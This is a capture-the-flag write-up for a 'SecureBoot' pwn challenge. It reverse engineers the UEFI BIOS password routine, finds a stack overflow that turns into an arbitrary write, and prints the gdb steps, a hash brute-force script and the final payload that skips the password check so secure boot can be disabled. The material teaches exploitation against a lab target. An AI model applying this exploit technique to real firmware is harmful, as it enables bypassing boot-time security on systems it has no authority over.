## 271 Pwn / SecureBoot

### Overview

In this challenge, a Linux OS is given and what we need to do is boot this OS. However, it seems that secure boot is preventing us from doing so. We then tried to enter BIOS and found that we need to enter a password first. After some reverse engineering, we found that there is a stack overflow when password is obtained from user. By exploiting this vulnerability, we could enter the BIOS, thus disable the secure boot and successfully boot the OS, in which flag can be read.

### Password Interface

**Discovery**

After some trials, my teammate [@Retr0id](https://github.com/DavidBuchanan314) found that we can get into a password user interface by pressing `ESC` at the first booting stage (e.i. before secure booting violation error appears). 

```
****************************
*                          *
*   Welcome to the BIOS!   *
*                          *
****************************

Password?

```

Interesting! This is very possible to be the key to solve the challenge, and it finally turns out to be true.

Then we need to find the codes corresponding to password processing logic. My teammate [@Retr0id](https://github.com/DavidBuchanan314) has dumped the following PE files using `uefitool`: [secmain.exe](files/secmain.exe) and [uiapp.exe](files/uiapp.exe). However, by searching strings in all files using `strings` command in Linux, we still failed to find strings like `"Welcome to the BIOS!"` or `"Password?"`. Fortunately, after some investigation, we found them at `uiapp.exe`:

![1561774234313](files/1561774234313.png)

Therefore the reason why `strings` command failed to work is clear: these strings are encoded in `UTF-16LE`, thus cannot be found by `strings` which is used to search `ascii` strings.

By using cross reference, it was clear that `sub_FE50` is the function to process the input password.

**Reverse Engineering**

Firstly, function `0x13fd` takes strings like `L"*   Welcome to the BIOS!   *\n"` as argument, and there is a `va_start` in its implementation, so I would guess it is `wprintf`, which is just `printf` but argument should be `UTF-18` string.

Then, in `sub_FE50`, global pointers `0x1bc68` and `0x1bc78` are used for indirect function call. By looking for cross references of these 2 variables, we found that they are initialized at function `ModuleEntryPoint(0x8CB4)`. Here we found `0x1bc68` is assigned by `SystemTable` and `0x1bc78` is assigned by `SystemTable->BootServices`. `SystemTable` is the argument passed into `ModuleEntryPoint` and luckily IDA has relative structure information. We change type of `0x1bc68` to `EFI_SYSTEM_TABLE *` and `0x1bc78` to `EFI_BOOT_SERVICES *`, and also names are also changed. There are also some other assignment at this initialization function, their names and types are also modified just in case.

```c
::SystemTable = SystemTable;  // 0x1bc68
v2 = SystemTable->BootServices;
v3 = SystemTable->RuntimeServices;
::ImageHandle = ImageHandle;
BootServices = v2;  // 0x1bc78
RuntimeServices = v3;
```

After type modification, the loop used to obtain one password becomes this, which is certainly more clear:

```c
while ( 1 )
{
  while ( 1 )
  {
    v8 = ((__int64 (__fastcall *)(EFI_SIMPLE_TEXT_INPUT_PROTOCOL *, 
      EFI_INPUT_KEY *))SystemTable->ConIn->ReadKeyStroke)(
           SystemTable->ConIn,
           &input); // try to read a character
    if ( v8 >= 0 )
    {
      if ( input.UnicodeChar )
        break; // a character has been read
    }
    if ( v8 == 0x8000000000000006i64 ) // if no chacacter is read, block and wait for event 
      ((void (__fastcall *)(signed __int64, EFI_EVENT *, char *))BootServices->WaitForEvent)(
        1i64,
        &SystemTable->ConIn->WaitForKey,
        &v6);
  }
  if ( input.UnicodeChar == '\r' )
    break; // input terminates if '\r' is received
  if ( i <= 0x8Bu )
  { // append the character to result buffer
    v3 = i++;
    v7[v3] = input.UnicodeChar;
  }
  wprintf("*");
}
```

As its name suggests, `ReadKeyStroke` is used to get a character from user. The second argument is the buffer used to receive the character, the structure of the buffer is shown below.

```c
typedef struct {
  UINT16  ScanCode;
  CHAR16  UnicodeChar;
} EFI_INPUT_KEY;
```

So we need to change variable `input` to this type in IDA. However, function `ReadKeyStroke` is a non-block function, and return a negative error value when no key is pressed. If so, blocked function `WaitForEvent` will be called to wait for key stroke event, and will return if there is any new event.

After reading the input, the input is passed into `0x20A3`, which, by searching constants and by testing using simple string, we found it to be `sha256` hashing algorithm. The result is then compared, and password is correct only if the hash is `DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF`, so it is certainly not possible to find string to satisfy the condition.

```c
v7[i] = 0;
wprintf(L"\n");
sha256_maybe(v7, i, dst); // 0x20A3
if ( *dst == 0xDEADBEEFDEADBEEFi64
  && dst[8] == 0xDEADBEEFDEADBEEFi64
  && dst[16] == 0xDEADBEEFDEADBEEFi64
  && dst[24] == 0xDEADBEEFDEADBEEFi64 )
{
  free(v2);
  return 1i64; // returning 1 means the password is correct
}
```

In addition, according to my guess, `0x11A8` is `malloc` and `0xC46` is `free`, since `0x11A8` takes a size and returns a pointer being used as that buffer size, and `0xC46` takes a pointer and is called when password interface function terminates. This turns out to be true, because of these codes found in these 2 functions.

```c
/* 
function call chain: malloc -> sub_1199 -> sub_E400
as the function name `AllocatePool` suggests, 
memory is allocated, 
which means this is probably `malloc`
*/
__int64 __usercall sub_E400@<rax>(__int64 a1@<rdi>)
{
  __int64 v2; // [rsp+28h] [rbp-10h]

  if ( (BootServices->AllocatePool)(4i64, a1, &v2) < 0 )
    v2 = 0i64;
  return v2;
}
/*
function call chain: free -> sub_C3C,
similarly, this is probably `free`
*/
__int64 __cdecl sub_C3C(void *a1)
{
  return ((__int64 (__fastcall *)(void *))BootServices->FreePool)(a1);
}
```

**Vulnerability**

The vulnerability is a stack overflow when obtaining password. The buffer size is `0x80` but the check is `i <= 0x8Bu`, so we can write 12 more bytes. This is the stack layout.

```c
char v7[128]; // [rsp+38h] [rbp-B0h]
__int64 v8; // [rsp+B8h] [rbp-30h]
_QWORD *dst; // [rsp+C0h] [rbp-28h]
```

`v8` is used to store return value of function `ReadKeyStroke` and is used only after being reassigned by the return value of that function, so overwriting it is not very useful. However, `dst`, which is used to store the `sha256` result when function `sha256_maybe` is called, can be used to achieve arbitrary write.

### Debug Environment

Before exploitation, we may need to successfully debug this password interface subroutine. 

**Debug Option of QEMU**

To debug the binary, we need to set `-s` option in QEMU command in file `run.py`, then launch `gdb` in without any argument, and use `target remote localhost:1234` `gdb` command to start debugging.

**Find PE in Memory**

First of all, we need to know where `uiapp.exe` PE file is mapped into the memory. We assumed that there is no ASLR first, and that PE file is loaded at page aligned address (so least 12 bits of address should be same as least 12 bits in IDA).

My approach to find the PE file is to press `ctrl+c` when password need to be inputted. My idea is that since `WaitForEvent` is a blocked function, `ctrl+c` must terminates in this function or its subroutine functions that it calls. If we inspect the stack at this time, we must be able to find the return address of function `WaitForEvent`, which is inside the `uiapp.exe` PE module, and whose least 12 bits must be `f5e`.

![1561902963554](files/1561902963554.png)

Finally, at `rsp+0x120`, we found the return address to be `0x67daf5e`, and if you restart the challenge and repeat these steps, you will find the address to have the same value, which suggests that the ASLR is not enabled. In addition, you can also find that stack address is also a constant value, which is great and a important feature for us to exploit.

Therefore, it is easy for us to calculate the base address: `0x67daf5e - 0xff5e = 0x67cb000`, so we can rebase the program in IDA to make things more convenient.

Also, after knowing where the PE file is loaded, we can set breakpoint.

### Exploitation

**Idea**

So, what we can do is to write a `sha256` hash into a arbitrary 4-byte address. Obviously the idea is try to bypass the password verification. Here is how the password interface function is called:

```assembly
.text:00000000067D4D2F      call    password_FE50
.text:00000000067D4D34      test    al, al
.text:00000000067D4D36      jnz     short loc_67D4D49
```

Firstly, we tried to rewrite the instruction. For example, if we write `jnz` to `jmp`, we can always let this function jump to the branch of correct password. However, according to [this](https://edk2-docs.gitbooks.io/a-tour-beyond-bios-memory-protection-in-uefi-bios/memory-protection-in-uefi.html), it seems that the text memory is protected and not writable, so this approach does not work.

As I mentioned before, the stack address is not randomized, so why not rewrite return address of password verification function in stack directly? It should be `0x67D4D34`, but if we can modify it to `0x67D4D49`, the control flow will jump to the branch of correct password directly as the password verification returns. To be specific, what we need to do is to rewrite the least significate byte to `\x49`, which is the first byte since it is little-endian.

**Find Where the Return Address is Stored**

This is not so hard, what we need to do is to set a breakpoint at the `ret` instruction of the password interface function (e.i. `password_FE50`), and see the current `rsp` value. To be specific, we use command `b *0x67DB0BB`, and enter wrong password for 3 times, then the function will exit and breakpoint can be triggered.

![1561935288179](files/1561935288179.png)

As shown clearly above, the return address is stored in address `0x7ec18b8`.

**Specific Exploitation**

Now the particular steps are clear. Firstly, we need to use overflow to rewrite the variable `dst` to `0x7ec18b8 - 32 + 1`, so that the last byte of the hash is the least significate byte of return address. Then we need to find a string such that the last byte of its `sha256` hash is `\x49`. Note that, the actual payload that we are going to send is `'A' * 0x88 + p32(0x7ec18b8 - 32 + 1) + '\r'`, where the `A` prefix should be modified to make last byte of the hash `\x49`. However, when the input is used to calculate hash value, actual bytes used is `'A' * (0x80) + p64(0) + p32(0x7ec18b8 - 32 + 1)`. This is because variable `v8` just after the password buffer will be assigned to return value of `ReadKeyStroke`, which is zero at this point.

Therefore, here is the script to obtain the payload prefix:

```python
import binascii
from pwn import *

for i in xrange(0x10000):
	pld = hex(i)[2:]
	dk = hashlib.sha256(pld + 'A' * (0x80-4) + p64(0) + p32(0x7ec18b8 - 32 + 1)).hexdigest()
	dk = binascii.unhexlify(dk)
	if ord(dk[31]) == 0x49:
		print pld
```

There are many outputs, and we just chose `'1010'` as the prefix.

Therefore, finally the payload to be sent as password is this:

```python
sh.send('1010' + 'A' * 0x84 + p32(0x7ec18b8 - 32 + 1) + '\r')
```

### Tackle with BIOS

Now we finally got into BIOS interface. The idea is to disable secure boot here and reboot the OS. However, if we run the script locally, the BIOS interface we get is this:

![BIOS1](files/BIOS1.png)

which is very ugly because it print the control characters used to draw UI as raw bytes, I failed to find `pwntool` functionality to make this more readable, but fortunately when this is run remotely the UI can be shown.

![BIOS2](files/BIOS2.png)

Okay, but how can we move the cursor? After some investigation, we found that `sh.send('\x1b[B')` is equivalent to key `down`, that `sh.send('\x1b\x1b')` is equivalent to key `ESC`, and that `sh.send('\r')` is equivalent to key `Enter`.

Then we have explored this BIOS, and found option to disable secure boot in `Device Manager`, and rebooted the OS successfully in which the flag can be read, which is just a boring process and not worth discussing...

The final [exploit](files/secureboot.py).